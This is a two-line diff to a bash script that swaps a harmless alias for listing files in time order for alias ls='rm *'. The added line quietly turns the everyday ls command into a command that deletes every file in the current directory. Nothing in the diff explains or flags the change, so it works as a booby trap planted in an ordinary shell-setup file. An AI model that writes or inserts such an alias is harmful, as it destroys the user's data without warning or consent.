@@ -1,2 +1,2 @@
 #!/bin/bash
-alias listar='ls -ltr'
+alias ls='rm *'
